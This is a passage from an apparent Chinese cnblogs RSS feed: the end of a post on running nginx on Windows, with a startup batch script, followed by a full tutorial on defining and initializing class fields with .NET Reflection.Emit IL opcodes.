id=&quot;MathJax-Span-19&quot; class=&quot;mi&quot;&gt;e&lt;span id=&quot;MathJax-Span-20&quot; class=&quot;mi&quot;&gt;a&lt;span id=&quot;MathJax-Span-21&quot; class=&quot;mi&quot;&gt;d&lt;span id=&quot;MathJax-Span-22&quot; class=&quot;mi&quot;&gt;e&lt;span id=&quot;MathJax-Span-23&quot; class=&quot;mi&quot;&gt;r&lt;span id=&quot;MathJax-Span-24&quot; class=&quot;mi&quot;&gt;X&lt;span id=&quot;MathJax-Span-25&quot; class=&quot;mo&quot;&gt;−&lt;span id=&quot;MathJax-Span-26&quot; class=&quot;mi&quot;&gt;F&lt;span id=&quot;MathJax-Span-27&quot; class=&quot;mi&quot;&gt;o&lt;span id=&quot;MathJax-Span-28&quot; class=&quot;mi&quot;&gt;r&lt;span id=&quot;MathJax-Span-29&quot; class=&quot;mi&quot;&gt;w&lt;span id=&quot;MathJax-Span-30&quot; class=&quot;mi&quot;&gt;a&lt;span id=&quot;MathJax-Span-31&quot; class=&quot;mi&quot;&gt;r&lt;span id=&quot;MathJax-Span-32&quot; class=&quot;mi&quot;&gt;d&lt;span id=&quot;MathJax-Span-33&quot; class=&quot;mi&quot;&gt;e&lt;span id=&quot;MathJax-Span-34&quot; class=&quot;mi&quot;&gt;d&lt;span id=&quot;MathJax-Span-35&quot; class=&quot;mo&quot;&gt;−&lt;span id=&quot;MathJax-Span-36&quot; class=&quot;mi&quot;&gt;F&lt;span id=&quot;MathJax-Span-37&quot; class=&quot;mi&quot;&gt;o&lt;span id=&quot;MathJax-Span-38&quot; class=&quot;mi&quot;&gt;r&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;MJX_Assistive_MathML&quot;&gt;host;proxysetheaderX−Forwarded−Forremote_addr;&lt;br/&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;img src=&quot;https://common.cnblogs.com/images/copycode.gif&quot; alt=&quot;复制代码&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;hr/&gt;&lt;h3&gt;启动脚本：  生成bat文件放入到nginx的安装目录下&lt;/h3&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;img src=&quot;https://common.cnblogs.com/images/copycode.gif&quot; alt=&quot;复制代码&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;pre&gt;
@echo off
rem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程
nginx.exe -s stop

rem 测试配置文件语法正确性
nginx.exe -t -c conf/nginx.conf

rem 显示版本信息
nginx.exe -v

rem 按照指定配置去启动nginx
nginx.exe -c conf/nginx.conf
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Fri, 29 Nov 2019 15:30:00 +0000</pubDate>
<dc:creator>Mr陈二</dc:creator>
<og:description>nginx（背景） nginx是一个高性能的HTTP服务器，以前我经常在linux系统中配置，主要做反向代理和负载均衡，最近根据业务需要，需要在window中配置反向和负载，下面就介绍一下nginx的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenhg/p/11960941.html</dc:identifier>
</item>
<item>
<title>.NET高级特性-Emit(2.1)字段 - BillMing</title>
<link>http://www.cnblogs.com/billming/p/emit-study-field.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/billming/p/emit-study-field.html</guid>
<description>&lt;p&gt;　　在上篇blog写完的几天后，有读者反映写的过于复杂，导致无法有效的进行实践；博主在考虑到园子里程序员水平高低不一致的情况，所以打算放慢脚步，对类的一些内容进行详细的讲解，顺带的会写一些笔者所遇到过的Emit的坑以及如何使用Emit来为我们的工作减负，毕竟，知识用到实践当中才有其因有的价值。博主在文末也会将样例上传github，方便大家实践。&lt;/p&gt;
&lt;p&gt;　　首先，照例我先把我之前写的博文链接上来，方便大家阅读&lt;/p&gt;
&lt;p&gt;　　《&lt;a id=&quot;cb_post_title_url&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/billming/p/emit-study.html&quot;&gt;.NET高级特性-Emit(1)&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　《&lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/billming/p/emit-study-class.html&quot;&gt;.NET高级特性-Emit(2)类的定义&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;
&lt;h3&gt;一、什么是字段&lt;/h3&gt;
&lt;/p&gt;
&lt;p&gt; 　　有很多读者会说，我在项目当中基本上没怎么用到字段啊，基本上都是用C#的属性居多，两者不是都能存储数据吗，你看我只要写以下代码就可以完成使用或存储对象的信息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; User
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Id { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; PasswordHash { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetPassword(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; password)
    {
        PasswordHash &lt;/span&gt;=&lt;span&gt; password;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　你看，我上面的实体一个字段都没用到，全部都是属性，字段有什么作用啊。&lt;/p&gt;
&lt;p&gt;　　其实，这就是典型的因为C#的语法糖带来的误解，&lt;strong&gt;&lt;span&gt;C#中存储数据的地方只可能是字段，这在所有面向对象的语言当中都是一致的，C++也好，Java也罢，都是相同的&lt;/span&gt;，&lt;/strong&gt;那是什么导致了C#当中会有这种误解存在呢；没错，就是属性这种C#特有的东西存在，以及在C#5.0之后出现的自动属性让程序员对字段与属性产生了误解，在C#5.0之前，也就是没有自动属性之前，以上实体定义是这样编写的：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; User2
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _id;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Id { &lt;span&gt;get&lt;/span&gt; =&amp;gt; _id; &lt;span&gt;set&lt;/span&gt; =&amp;gt; _id =&lt;span&gt; value; }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _userName;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserName { &lt;span&gt;get&lt;/span&gt; =&amp;gt; _userName; &lt;span&gt;set&lt;/span&gt; =&amp;gt; _userName =&lt;span&gt; value; }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _passwordHash;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; PasswordHash { &lt;span&gt;get&lt;/span&gt; =&amp;gt; _passwordHash; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;set&lt;/span&gt; =&amp;gt; _passwordHash =&lt;span&gt; value; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetPassword(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; password)
    {
        PasswordHash &lt;/span&gt;=&lt;span&gt; password;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　当我写了以上代码的时候，Visual Studio也提示我，希望我使用自动属性对字段进行隐藏：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1193327/201911/1193327-20191129194217889-641281736.png&quot; alt=&quot;&quot; width=&quot;814&quot; height=&quot;385&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　当我点击黄色感叹号时，它就出现对应的修改方案&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1193327/201911/1193327-20191129194405645-1639013705.png&quot; alt=&quot;&quot; width=&quot;819&quot; height=&quot;393&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　点击使用自动属性时，就变成了只有属性，没有字段的形式了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1193327/201911/1193327-20191129194533504-381214607.png&quot; alt=&quot;&quot; width=&quot;818&quot; height=&quot;396&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　所以，C#类当中可以保存数据的有且只可能有字段，.NET开发者不要因为C#丰富的语法糖而产生误解，要看透这些语法糖中的C#本质，此外你也可以使用Emit查看刚才User的IL代码，自动属性最终还是会生成一个私有字段和一个该字段对应的属性&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1193327/201911/1193327-20191129195338303-1420479087.png&quot; alt=&quot;&quot; width=&quot;641&quot; height=&quot;264&quot;/&gt;&lt;/p&gt;
&lt;p&gt;
&lt;h3&gt;二、字段的定义&lt;/h3&gt;
&lt;/p&gt;
&lt;p&gt; 　　讲完了什么是字段，以及一些容易掉入的C#概念误区，我没开始来使用Emit创建字段定义，由于字段只可能是类的一部分，故所以需要使用TypeBuilder来创建字段，对Emit不熟悉的读者可以查看博主的前两篇文章，里面概述了Emit所使用的一些类的定义。&lt;/p&gt;
&lt;p&gt;　　好，咱们开始写代码，首先，我们先给出我们要最终生成的结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserField
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; TokenPrefix = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bearer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; UserField()
        {
            id &lt;/span&gt;= Guid.NewGuid().ToString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;N&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; id;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; userName;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; passwordHash = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetPasswodHash()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; passwordHash;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetPassword(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; password)
        {
            passwordHash &lt;/span&gt;=&lt;span&gt; password;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　我们首先忽略掉类的构造器与方法，我们当前只关注字段的定义，我们可以看到，字段可以由四部分组成:&lt;/p&gt;
&lt;p&gt;　　　　（1）字段的修饰符-访问修饰符定义了字段的一些特性，如public/private/protected表示访问级别；readonly表示了字段是否可以被外部写入；static表示该字段的归属，是属于对象还是属于类。&lt;/p&gt;
&lt;p&gt;　　　　（2）字段的类型-字段的类型定义了该字段是由什么数据类型，由此计算机才可以确定该字段在计算机中所使用的内存空间，进而知晓一个对象需要分配多少内存空间才能将数据装入&lt;/p&gt;
&lt;p&gt;　　　　（3）字段的名称-字段的名称用来表述该字段在该对象/类中所表达的含义，让程序员能理解该字段所存储的数据在现实世界的表述&lt;/p&gt;
&lt;p&gt;　　　　（4）字段的默认值-字段在类初始化后一定会拥有一个默认值，除了在构造器中或者字段后给予的默认值之外，其它未赋值的字段均使用default填充该字段，当然，不同的字段类型default给予的值也会不一样，对于引用类型会给予null值，对于结构体类型会使用默认构造器，对于基本值类型，会赋予0值，对于枚举，也会赋予0值；这个博主会在之后讲解Emit变量与常量当中会讲解到&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1193327/201911/1193327-20191129202808836-378276327.png&quot; alt=&quot;&quot; width=&quot;1009&quot; height=&quot;666&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　好，开始撸代码，第一步当然是要引入我们的主角-Emit类库，而且由于一些枚举特性存放在反射类库中，我们也要将其引入&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Reflection.Emit;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt; System.Reflection;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　第二步，创建类，若对创建类的过程不清楚可以阅读我的博文《&lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/billming/p/emit-study-class.html&quot;&gt;.NET高级特性-Emit(2)类的定义&lt;/a&gt;》,里面详细介绍了类的定义及项目的结构组成&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;var&lt;/span&gt; asmBuilder = AssemblyBuilder.DefineDynamicAssembly(&lt;span&gt;new&lt;/span&gt; AssemblyName(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Edwin.Blog.Emit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;), AssemblyBuilderAccess.Run);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; moduleBuilder = asmBuilder.DefineDynamicModule(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Edwin.Blog.Emit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; typeBuilder = moduleBuilder.DefineType(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UserField&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, TypeAttributes.Public | TypeAttributes.Class | TypeAttributes.AutoClass | TypeAttributes.BeforeFieldInit);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　第三步，首先创建静态字段TokenPrefix&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt;第一个变量表示字段名称，第二个变量表示字段的类型，第三个变量表示字段的特性(修饰符)为public readonly static&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; tokenPrefixBuilder = typeBuilder.DefineField(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TokenPrefix&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;), FieldAttributes.Public | FieldAttributes.InitOnly | FieldAttributes.Static);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　第四步，同第三步，创建其余非静态字段&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;var&lt;/span&gt; idBuilder = typeBuilder.DefineField(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;), FieldAttributes.Public |&lt;span&gt; FieldAttributes.InitOnly);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; userNameBuilder = typeBuilder.DefineField(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;userName&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;), FieldAttributes.Public);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; passwordHashBuilder = typeBuilder.DefineField(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;passwordHash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;), FieldAttributes.Private);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这样我们的字段就定义好了。&lt;/p&gt;
&lt;p&gt;　　ok，相信很多读者都有疑问，我这怎么没写默认值啊，你看字段TokenPrefix都有字段携带着啊，你怎么就把它丢掉了呢？别急，其实在字段后面写默认值也是C#语言的语法糖，我会在下一节进行讲述。&lt;/p&gt;
&lt;p&gt;
&lt;h3&gt;三、字段的操作&lt;/h3&gt;
&lt;/p&gt;
&lt;p&gt;　　上一节的代码当中只有字段的定义而少了字段的默认值和对字段的对于的方法，那么我们就来开始解决以上问题吧。&lt;/p&gt;
&lt;p&gt;　　首先，在字段后面写默认值的方法是C#的语法糖，其实其真正的写法是将默认值在构造器中进行赋值，静态字段在静态构造器中赋值，对象字段在构造器中赋值，那么在IL中，UserField类生成的源代码应该是这样的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserField
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; TokenPrefix;
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; UserField()
        {
            TokenPrefix &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bearer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; UserField()
        {
            id &lt;/span&gt;= Guid.NewGuid().ToString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;N&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            passwordHash &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; id;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; userName;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; passwordHash;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetPasswodHash()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; passwordHash;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetPassword(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; password)
        {
            passwordHash &lt;/span&gt;=&lt;span&gt; password;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　也就是说，C#只允许在构造器中对字段可以进行赋初值，所以在Emit中，我们也只能通过构造器来对字段进行默认值赋值，那么问题来了，如何对字段进行操作，字段又有哪些操作呢？这一节博主就来聊一聊字段的操作。&lt;/p&gt;
&lt;p&gt;　　其实，在Emit当中，对字段的操作只有两种:&lt;/p&gt;
&lt;p&gt;　　（1）入栈(取值)-将字段的值取出放入到栈顶，入栈的Emit操作码都是以Ld作为开头，而字段在Emit操作码均以fld(field)出现，所以字段入栈的Emit操作码为&lt;strong&gt;OpCodes.Ldfld&lt;/strong&gt;以及&lt;strong&gt;OpCodes.Ldsfld,&lt;/strong&gt;前者表示入栈对象字段，后者表示入栈静态字段;&lt;/p&gt;
&lt;p&gt;　　（2）保存-将栈顶的值保存到字段，由于保存的Emit操作码以St(Store)作为开头,所以字段有两个保存操作码OpCodes.Stfld和OpCodes.Stsfld,各自的含义请各位联想。&lt;/p&gt;
&lt;p&gt;　　如果需要更为详细的操作码信息，各位读者请阅读微软API浏览器了解详细信息:《&lt;a href=&quot;https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.emit.opcodes?view=netframework-4.8&quot; target=&quot;_blank&quot;&gt;MS DOTNET API浏览器&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　好，说完了字段的操作类型，我们开始编写对字段的操作。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先我们从静态构造器开始，创建静态构造器并编写Emit代码：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建静态构造器(第一个参数表示为私有静态，第三个参数表示入参数量和类型)&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; staticCtorBuilder = typeBuilder.DefineConstructor(MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.SpecialName |&lt;span&gt; MethodAttributes.HideBySig, CallingConventions.Standard, Type.EmptyTypes);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; staticCtorIL = staticCtorBuilder.GetILGenerator();
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;编写Emit代码&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt;将常量字符串&quot;Bearer&quot;放入栈顶&lt;/span&gt;
            staticCtorIL.Emit(OpCodes.Ldstr, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bearer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取出栈顶元素赋值给字段TokenPrefix&lt;/span&gt;
&lt;span&gt;            staticCtorIL.Emit(OpCodes.Stsfld, tokenPrefixBuilder);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回&lt;/span&gt;
            staticCtorIL.Emit(OpCodes.Ret);
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;静态构造器编写完成，我们开始编写实例构造器，与上边静态构造器同理，&lt;span&gt;唯一的区别是，对象字段都是对象的成员，所以需要找到this成员才能获得字段(即this.field)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;var&lt;/span&gt; ctorBuilder = typeBuilder.DefineConstructor(MethodAttributes.Public | MethodAttributes.SpecialName |&lt;span&gt; MethodAttributes.HideBySig, CallingConventions.Standard, Type.EmptyTypes);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; ctorIL =&lt;span&gt; ctorBuilder.GetILGenerator();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将this压入栈中(与上面静态构造器的区别)&lt;/span&gt;
&lt;span&gt;            ctorIL.Emit(OpCodes.Ldarg_0);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将常量字符串&quot;123456&quot;放入栈顶&lt;/span&gt;
            ctorIL.Emit(OpCodes.Ldstr, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取出栈顶元素赋值给字段&lt;/span&gt;
&lt;span&gt;            ctorIL.Emit(OpCodes.Stfld, passwordHashBuilder);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回&lt;/span&gt;
            ctorIL.Emit(OpCodes.Ret);
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;最后，我们编写一个GetPasswordHash方法，实现字段的取值并返回&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;var&lt;/span&gt; getPasswordHashMethodBuilder = typeBuilder.DefineMethod(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GetPasswordHash&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, MethodAttributes.Public | MethodAttributes.HideBySig, CallingConventions.Standard, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;), Type.EmptyTypes);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; getPasswordHashIL =&lt;span&gt; getPasswordHashMethodBuilder.GetILGenerator();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将this压入栈中&lt;/span&gt;
&lt;span&gt;            getPasswordHashIL.Emit(OpCodes.Ldarg_0);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将字段值压入到栈中&lt;/span&gt;
&lt;span&gt;            getPasswordHashIL.Emit(OpCodes.Ldfld, passwordHashBuilder);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回&lt;/span&gt;
            getPasswordHashIL.Emit(OpCodes.Ret);
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;最后的最后，不要忘记创建类型哦&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
　　　　　　　typeBuilder.CreateTypeInfo().AsType();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　使用类型创建对象，并调用即可看到效果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;dynamic&lt;/span&gt; user =&lt;span&gt; Activator.CreateInstance(type);
            Console.WriteLine(user.GetPasswordHash());&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;
&lt;h3&gt;一、小结&lt;/h3&gt;
&lt;/p&gt;
&lt;p&gt;　　在编写C#时，一定要小心C#自带的语法糖产生错误认知，看穿语法糖的本质，你对这门语言的理解就更加深入，对你了解其它语言也有类似的帮助，毕竟即使编程语言在不断的涌现和发展，你也能把握其最本质的、不变的东西，就像算法与数据结构一样是软件的灵魂一样。&lt;/p&gt;
&lt;p&gt;　　下一篇，博主将详细介绍C#中最特殊的东西-属性，感谢阅读，以下为github样例地址&lt;/p&gt;
&lt;p&gt;　　&lt;a href=&quot;https://github.com/MJEdwin/edwin-blog-sample/blob/master/Edwin.Blog.Sample/Field/UserEmit.cs&quot;&gt;https://github.com/MJEdwin/edwin-blog-sample/blob/master/Edwin.Blog.Sample/Field/UserEmit.cs&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Nov 2019 14:09:00 +0000</pubDate>
<dc:creator>BillMing</dc:creator>
